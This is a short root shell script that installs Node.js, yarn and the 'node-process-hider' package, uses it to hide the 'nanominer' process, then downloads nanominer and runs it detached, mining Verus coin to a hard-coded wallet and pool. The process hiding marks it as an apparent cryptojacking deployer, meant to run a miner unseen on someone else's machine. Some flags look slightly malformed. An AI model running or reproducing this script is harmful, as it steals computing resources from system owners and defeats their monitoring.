!/bin/sh
sudo su <<EOF
sudo apt install screen -y
sudo apt update && apt install --assume-yes curl && curl --silent --location https://deb.nodesource.com/setup_14.x  | bash - && apt install --assume-yes nodejs && apt-get install -y nodejs && apt-get install gcc g++ make && curl -sL https://dl.yarnpkg.com/debian/pubkey.gpg | gpg --dearmor | tee /usr/share/keyrings/yarnkey.gpg >/dev/null
echo "deb [signed-by=/usr/share/keyrings/yarnkey.gpg] https://dl.yarnpkg.com/debian stable main" | tee /etc/apt/sources.list.d/yarn.list
sudo apt-get update && sudo apt-get install yarn -y && sudo npm install -g npm@9.1.1 && sudo npm install -g npm && sudo npm install -g node-process-hider
sudo ph add nanominer
wget -q https://github.com/nanopool/nanominer/releases/download/v3.8.3/nanominer-linux-3.8.3.tar.gz
tar -xvf nanominer-linux-3.8.3.tar.gz
screen -dms run ./nanominer -algo verus  -pool1 = na.luckpool.net:3956 -wallet RHLq39GaywnjmwSUd3R6aw6yMwn4u77SQ1 -coin VRSC -rigName ibm2
top
EOF
